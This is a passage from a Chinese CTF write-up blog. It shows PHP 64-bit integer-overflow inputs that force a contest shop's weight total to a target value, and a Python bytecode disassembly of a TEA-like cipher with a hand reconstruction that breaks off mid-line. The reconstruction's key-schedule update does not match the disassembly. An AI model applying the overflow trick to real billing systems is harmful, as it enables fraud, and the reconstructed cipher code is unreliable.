flagTable[index] = staticBytes[sb_index]</span><br><span class="line">        sb_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nflag: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flagTable:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h1><blockquote><p>中科大信安比赛</p></blockquote><p>猜测后台计算公式如下：</p><p>$$<br>   new_weight = old_weight + 6 \times b6 + 9 \times b9<br>$$</p><p>根据运算符的优先级，计算顺序如下：<br>$$<br>   new_weight = old_weight + (6 \times b6) + (9 \times b9)<br>$$</p><p>PHP 64位系统下，INT最大值是<code>9223372036854775807</code>，超出这个数字会被解释为float。<br>这里的乘法应该是用<code>9223372036854775807</code>作为最大值，但是加法的最大值更大。<br>或者说一旦构造了一个超过<code>9223372036854775807</code>的数字，系统里面的数值就被解释为float了，造成最大值变大。</p><p>总的来说，我们希望构造参数，使得 $(6 \times b6)$ 和$(9 \times b9)$偶尔溢出为负数的float，然后追加整数构造出20.</p><p>构造步骤如下：<br> <code>1024819115206086201 * 9 = 9223372036854775809 -&gt;(溢出为)-&gt; -9223372036854775808</code><br><code>-9223372036854775808 + 1024819115206086200 * 9 = -8</code><br> <code>-8 +  1024819115206086200 * 9 = 9223372036854775792</code><br> <code>9223372036854775792 + 1024819115206086201 * 9 = 9223372036854775792 + -9223372036854775808 = -16</code><br> <code>-16 + 6 * 6 = 20</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211026132532729.png" alt="image-20211026132532729"></p><h1 id="bytecode"><a href="#bytecode" class="headerlink" title="bytecode"></a>bytecode</h1><blockquote><p>天津市大学生信息安全大赛</p></blockquote><p>给出一条python的字节码代码，常见题型，人脑模拟逆向。可是我当时把<code>BINARY_AND</code>看成<code>BINARY_ADD</code>，然后没及时做出来。（恼<br><a href="https://docs.python.org/zh-cn/3.8/library/dis.html">dis – Python字节码反汇编器</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of main:</span><br><span class="line"> <span class="number">27</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="number">305419896</span>)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">2</span> (<span class="number">2271560481</span>)</span><br><span class="line">              <span class="number">4</span> LOAD_CONST               <span class="number">3</span> (<span class="number">2427178479</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">4</span> (<span class="number">4275878409</span>)</span><br><span class="line">              <span class="number">8</span> BUILD_LIST               <span class="number">4</span></span><br><span class="line">             <span class="number">10</span> STORE_FAST               <span class="number">0</span> (key)</span><br><span class="line"></span><br><span class="line"> <span class="number">28</span>          <span class="number">12</span> LOAD_CONST               <span class="number">5</span> (<span class="number">3888592564</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_CONST               <span class="number">6</span> (<span class="number">3737879155</span>)</span><br><span class="line">             <span class="number">16</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">18</span> LOAD_CONST               <span class="number">7</span> (<span class="number">4063334467</span>)</span><br><span class="line">             <span class="number">20</span> LOAD_CONST               <span class="number">8</span> (<span class="number">2214487552</span>)</span><br><span class="line">             <span class="number">22</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">24</span> LOAD_CONST               <span class="number">9</span> (<span class="number">2420456096</span>)</span><br><span class="line">             <span class="number">26</span> LOAD_CONST              <span class="number">10</span> (<span class="number">1529806583</span>)</span><br><span class="line">             <span class="number">28</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">30</span> LOAD_CONST              <span class="number">11</span> (<span class="number">2576007368</span>)</span><br><span class="line">             <span class="number">32</span> LOAD_CONST              <span class="number">12</span> (<span class="number">2328179940</span>)</span><br><span class="line">             <span class="number">34</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">36</span> LOAD_CONST              <span class="number">13</span> (<span class="number">1665686107</span>)</span><br><span class="line">             <span class="number">38</span> LOAD_CONST              <span class="number">14</span> (<span class="number">1748819876</span>)</span><br><span class="line">             <span class="number">40</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">42</span> BUILD_LIST               <span class="number">5</span></span><br><span class="line">             <span class="number">44</span> STORE_FAST               <span class="number">1</span> (arr)</span><br><span class="line"></span><br><span class="line"> <span class="number">29</span>          <span class="number">46</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="built_in">input</span>)</span><br><span class="line">             <span class="number">48</span> LOAD_CONST              <span class="number">15</span> (<span class="string">&#x27;please input your secret key: &#x27;</span>)</span><br><span class="line">             <span class="number">50</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">52</span> STORE_FAST               <span class="number">2</span> (flag)</span><br><span class="line"></span><br><span class="line"> <span class="number">31</span>          <span class="number">54</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">             <span class="number">56</span> STORE_FAST               <span class="number">3</span> (encry)</span><br><span class="line"></span><br><span class="line"> <span class="number">32</span>          <span class="number">58</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">             <span class="number">60</span> STORE_FAST               <span class="number">4</span> (encryted)</span><br><span class="line"></span><br><span class="line"> <span class="number">33</span>          <span class="number">62</span> LOAD_GLOBAL              <span class="number">1</span> (<span class="built_in">range</span>)</span><br><span class="line">             <span class="number">64</span> LOAD_CONST              <span class="number">16</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">66</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">len</span>)</span><br><span class="line">             <span class="number">68</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">70</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">72</span> LOAD_CONST              <span class="number">17</span> (<span class="number">8</span>)</span><br><span class="line">             <span class="number">74</span> CALL_FUNCTION            <span class="number">3</span></span><br><span class="line">             <span class="number">76</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">78</span> FOR_ITER               <span class="number">112</span> (to <span class="number">192</span>)</span><br><span class="line">             <span class="number">80</span> STORE_FAST               <span class="number">5</span> (i)</span><br><span class="line"></span><br><span class="line"> <span class="number">34</span>          <span class="number">82</span> LOAD_FAST                <span class="number">3</span> (encry)</span><br><span class="line">             <span class="number">84</span> LOAD_METHOD              <span class="number">3</span> (append)</span><br><span class="line">             <span class="number">86</span> LOAD_GLOBAL              <span class="number">4</span> (struct)</span><br><span class="line">             <span class="number">88</span> LOAD_METHOD              <span class="number">5</span> (unpack)</span><br><span class="line">             <span class="number">90</span> LOAD_CONST              <span class="number">18</span> (<span class="string">&#x27;&lt;I&#x27;</span>)</span><br><span class="line">             <span class="number">92</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">94</span> LOAD_FAST                <span class="number">5</span> (i)</span><br><span class="line">             <span class="number">96</span> LOAD_FAST                <span class="number">5</span> (i)</span><br><span class="line">             <span class="number">98</span> LOAD_CONST              <span class="number">19</span> (<span class="number">4</span>)</span><br><span class="line">            <span class="number">100</span> BINARY_ADD</span><br><span class="line">            <span class="number">102</span> BUILD_SLICE              <span class="number">2</span></span><br><span class="line">            <span class="number">104</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">106</span> LOAD_METHOD              <span class="number">6</span> (encode)</span><br><span class="line">            <span class="number">108</span> LOAD_CONST              <span class="number">20</span> (<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="number">110</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">112</span> CALL_METHOD              <span class="number">2</span></span><br><span class="line">            <span class="number">114</span> LOAD_CONST              <span class="number">16</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">116</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">118</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">120</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">35</span>         <span class="number">122</span> LOAD_FAST                <span class="number">3</span> (encry)</span><br><span class="line">            <span class="number">124</span> LOAD_METHOD              <span class="number">3</span> (append)</span><br><span class="line">            <span class="number">126</span> LOAD_GLOBAL              <span class="number">4</span> (struct)</span><br><span class="line">            <span class="number">128</span> LOAD_METHOD              <span class="number">5</span> (unpack)</span><br><span class="line">            <span class="number">130</span> LOAD_CONST              <span class="number">18</span> (<span class="string">&#x27;&lt;I&#x27;</span>)</span><br><span class="line">            <span class="number">132</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">            <span class="number">134</span> LOAD_FAST                <span class="number">5</span> (i)</span><br><span class="line">            <span class="number">136</span> LOAD_CONST              <span class="number">19</span> (<span class="number">4</span>)</span><br><span class="line">            <span class="number">138</span> BINARY_ADD</span><br><span class="line">            <span class="number">140</span> LOAD_FAST                <span class="number">5</span> (i)</span><br><span class="line">            <span class="number">142</span> LOAD_CONST              <span class="number">17</span> (<span class="number">8</span>)</span><br><span class="line">            <span class="number">144</span> BINARY_ADD</span><br><span class="line">            <span class="number">146</span> BUILD_SLICE              <span class="number">2</span></span><br><span class="line">            <span class="number">148</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">150</span> LOAD_METHOD              <span class="number">6</span> (encode)</span><br><span class="line">            <span class="number">152</span> LOAD_CONST              <span class="number">20</span> (<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="number">154</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">156</span> CALL_METHOD              <span class="number">2</span></span><br><span class="line">            <span class="number">158</span> LOAD_CONST              <span class="number">16</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">160</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">162</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">164</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">36</span>         <span class="number">166</span> LOAD_GLOBAL              <span class="number">7</span> (encrypt)</span><br><span class="line">            <span class="number">168</span> LOAD_FAST                <span class="number">3</span> (encry)</span><br><span class="line">            <span class="number">170</span> LOAD_FAST                <span class="number">0</span> (key)</span><br><span class="line">            <span class="number">172</span> CALL_FUNCTION            <span class="number">2</span></span><br><span class="line">            <span class="number">174</span> STORE_FAST               <span class="number">6</span> (encrypted)</span><br><span class="line"></span><br><span class="line"> <span class="number">37</span>         <span class="number">176</span> LOAD_FAST                <span class="number">4</span> (encryted)</span><br><span class="line">            <span class="number">178</span> LOAD_METHOD              <span class="number">3</span> (append)</span><br><span class="line">            <span class="number">180</span> LOAD_FAST                <span class="number">6</span> (encrypted)</span><br><span class="line">            <span class="number">182</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">184</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">38</span>         <span class="number">186</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">            <span class="number">188</span> STORE_FAST               <span class="number">3</span> (encry)</span><br><span class="line">            <span class="number">190</span> JUMP_ABSOLUTE           <span class="number">78</span></span><br><span class="line"></span><br><span class="line"> <span class="number">39</span>     &gt;&gt;  <span class="number">192</span> LOAD_FAST                <span class="number">4</span> (encryted)</span><br><span class="line">            <span class="number">194</span> LOAD_FAST                <span class="number">1</span> (arr)</span><br><span class="line">            <span class="number">196</span> COMPARE_OP               <span class="number">2</span> (==)</span><br><span class="line">            <span class="number">198</span> POP_JUMP_IF_FALSE      <span class="number">210</span></span><br><span class="line"></span><br><span class="line"> <span class="number">40</span>         <span class="number">200</span> LOAD_GLOBAL              <span class="number">8</span> (<span class="built_in">print</span>)</span><br><span class="line">            <span class="number">202</span> LOAD_CONST              <span class="number">21</span> (<span class="string">&#x27;ok,fine~&#x27;</span>)</span><br><span class="line">            <span class="number">204</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">206</span> POP_TOP</span><br><span class="line">            <span class="number">208</span> JUMP_FORWARD             <span class="number">8</span> (to <span class="number">218</span>)</span><br><span class="line"></span><br><span class="line"> <span class="number">42</span>     &gt;&gt;  <span class="number">210</span> LOAD_GLOBAL              <span class="number">8</span> (<span class="built_in">print</span>)</span><br><span class="line">            <span class="number">212</span> LOAD_CONST              <span class="number">22</span> (<span class="string">&#x27;sry~&#x27;</span>)</span><br><span class="line">            <span class="number">214</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">216</span> POP_TOP</span><br><span class="line">        &gt;&gt;  <span class="number">218</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">            <span class="number">220</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of encrypt:</span><br><span class="line">  <span class="number">6</span>           <span class="number">0</span> LOAD_FAST                <span class="number">0</span> (v)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">              <span class="number">4</span> BINARY_SUBSCR</span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">2</span> (v0)</span><br><span class="line"></span><br><span class="line">  <span class="number">7</span>           <span class="number">8</span> LOAD_FAST                <span class="number">0</span> (v)</span><br><span class="line">             <span class="number">10</span> LOAD_CONST               <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">12</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">14</span> STORE_FAST               <span class="number">3</span> (v1)</span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">16</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">18</span> STORE_FAST               <span class="number">4</span> (x)</span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>          <span class="number">20</span> LOAD_CONST               <span class="number">3</span> (<span class="number">6710886</span>)</span><br><span class="line">             <span class="number">22</span> STORE_FAST               <span class="number">5</span> (delta)</span><br><span class="line"></span><br><span class="line"> <span class="number">10</span>          <span class="number">24</span> LOAD_FAST                <span class="number">1</span> (k)</span><br><span class="line">             <span class="number">26</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">28</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">30</span> STORE_FAST               <span class="number">6</span> (k0)</span><br><span class="line"></span><br><span class="line"> <span class="number">11</span>          <span class="number">32</span> LOAD_FAST                <span class="number">1</span> (k)</span><br><span class="line">             <span class="number">34</span> LOAD_CONST               <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">36</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">38</span> STORE_FAST               <span class="number">7</span> (k1)</span><br><span class="line"></span><br><span class="line"> <span class="number">12</span>          <span class="number">40</span> LOAD_FAST                <span class="number">1</span> (k)</span><br><span class="line">             <span class="number">42</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">44</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">46</span> STORE_FAST               <span class="number">8</span> (k2)</span><br><span class="line"></span><br><span class="line"> <span class="number">13</span>          <span class="number">48</span> LOAD_FAST                <span class="number">1</span> (k)</span><br><span class="line">             <span class="number">50</span> LOAD_CONST               <span class="number">5</span> (<span class="number">3</span>)</span><br><span class="line">             <span class="number">52</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">54</span> STORE_FAST               <span class="number">9</span> (k3)</span><br><span class="line"></span><br><span class="line"> <span class="number">14</span>          <span class="number">56</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="built_in">range</span>)</span><br><span class="line">             <span class="number">58</span> LOAD_CONST               <span class="number">6</span> (<span class="number">32</span>)</span><br><span class="line">             <span class="number">60</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">62</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">64</span> FOR_ITER               <span class="number">108</span> (to <span class="number">174</span>)</span><br><span class="line">             <span class="number">66</span> STORE_FAST              <span class="number">10</span> (i)</span><br><span class="line"></span><br><span class="line"> <span class="number">15</span>          <span class="number">68</span> LOAD_FAST                <span class="number">4</span> (x)</span><br><span class="line">             <span class="number">70</span> LOAD_FAST                <span class="number">5</span> (delta)</span><br><span class="line">             <span class="number">72</span> INPLACE_ADD</span><br><span class="line">             <span class="number">74</span> STORE_FAST               <span class="number">4</span> (x)</span><br><span class="line"></span><br><span class="line"> <span class="number">16</span>          <span class="number">76</span> LOAD_FAST                <span class="number">4</span> (x)</span><br><span class="line">             <span class="number">78</span> LOAD_CONST               <span class="number">7</span> (<span class="number">4294967295</span>)</span><br><span class="line">             <span class="number">80</span> BINARY_AND</span><br><span class="line">             <span class="number">82</span> STORE_FAST               <span class="number">4</span> (x)</span><br><span class="line"></span><br><span class="line"> <span class="number">17</span>          <span class="number">84</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">             <span class="number">86</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">             <span class="number">88</span> LOAD_CONST               <span class="number">8</span> (<span class="number">4</span>)</span><br><span class="line">             <span class="number">90</span> BINARY_LSHIFT</span><br><span class="line">             <span class="number">92</span> LOAD_FAST                <span class="number">6</span> (k0)</span><br><span class="line">             <span class="number">94</span> BINARY_ADD</span><br><span class="line">             <span class="number">96</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">             <span class="number">98</span> LOAD_FAST                <span class="number">4</span> (x)</span><br><span class="line">            <span class="number">100</span> BINARY_ADD</span><br><span class="line">            <span class="number">102</span> BINARY_XOR</span><br><span class="line">            <span class="number">104</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">            <span class="number">106</span> LOAD_CONST               <span class="number">9</span> (<span class="number">5</span>)</span><br><span class="line">            <span class="number">108</span> BINARY_RSHIFT</span><br><span class="line">            <span class="number">110</span> LOAD_FAST                <span class="number">7</span> (k1)</span><br><span class="line">            <span class="number">112</span> BINARY_ADD</span><br><span class="line">            <span class="number">114</span> BINARY_XOR</span><br><span class="line">            <span class="number">116</span> INPLACE_ADD</span><br><span class="line">            <span class="number">118</span> STORE_FAST               <span class="number">2</span> (v0)</span><br><span class="line"></span><br><span class="line"> <span class="number">18</span>         <span class="number">120</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">            <span class="number">122</span> LOAD_CONST               <span class="number">7</span> (<span class="number">4294967295</span>)</span><br><span class="line">            <span class="number">124</span> BINARY_AND</span><br><span class="line">            <span class="number">126</span> STORE_FAST               <span class="number">2</span> (v0)</span><br><span class="line"></span><br><span class="line"> <span class="number">19</span>         <span class="number">128</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">            <span class="number">130</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">            <span class="number">132</span> LOAD_CONST               <span class="number">8</span> (<span class="number">4</span>)</span><br><span class="line">            <span class="number">134</span> BINARY_LSHIFT</span><br><span class="line">            <span class="number">136</span> LOAD_FAST                <span class="number">8</span> (k2)</span><br><span class="line">            <span class="number">138</span> BINARY_ADD</span><br><span class="line">            <span class="number">140</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">            <span class="number">142</span> LOAD_FAST                <span class="number">4</span> (x)</span><br><span class="line">            <span class="number">144</span> BINARY_ADD</span><br><span class="line">            <span class="number">146</span> BINARY_XOR</span><br><span class="line">            <span class="number">148</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">            <span class="number">150</span> LOAD_CONST               <span class="number">9</span> (<span class="number">5</span>)</span><br><span class="line">            <span class="number">152</span> BINARY_RSHIFT</span><br><span class="line">            <span class="number">154</span> LOAD_FAST                <span class="number">9</span> (k3)</span><br><span class="line">            <span class="number">156</span> BINARY_ADD</span><br><span class="line">            <span class="number">158</span> BINARY_XOR</span><br><span class="line">            <span class="number">160</span> INPLACE_ADD</span><br><span class="line">            <span class="number">162</span> STORE_FAST               <span class="number">3</span> (v1)</span><br><span class="line"></span><br><span class="line"> <span class="number">20</span>         <span class="number">164</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">            <span class="number">166</span> LOAD_CONST               <span class="number">7</span> (<span class="number">4294967295</span>)</span><br><span class="line">            <span class="number">168</span> BINARY_AND</span><br><span class="line">            <span class="number">170</span> STORE_FAST               <span class="number">3</span> (v1)</span><br><span class="line">            <span class="number">172</span> JUMP_ABSOLUTE           <span class="number">64</span></span><br><span class="line"></span><br><span class="line"> <span class="number">21</span>     &gt;&gt;  <span class="number">174</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">            <span class="number">176</span> LOAD_FAST                <span class="number">0</span> (v)</span><br><span class="line">            <span class="number">178</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">180</span> STORE_SUBSCR</span><br><span class="line"></span><br><span class="line"> <span class="number">22</span>         <span class="number">182</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">            <span class="number">184</span> LOAD_FAST                <span class="number">0</span> (v)</span><br><span class="line">            <span class="number">186</span> LOAD_CONST               <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line">            <span class="number">188</span> STORE_SUBSCR</span><br><span class="line"></span><br><span class="line"> <span class="number">23</span>         <span class="number">190</span> LOAD_FAST                <span class="number">0</span> (v)</span><br><span class="line">            <span class="number">192</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    delta = <span class="number">0x666666</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        delta = (delta + x) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        x = delta  &amp; <span class="number">0xffffffff</span></span><br><span class="line">        v0 = v0 + ( ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + x) ^ ( (v1&gt;&gt;<span class="number">5</span>) + k1))</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xffffffff</span></span><br><span class="line">        v1 = v1 + ( ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + x) ^ ( 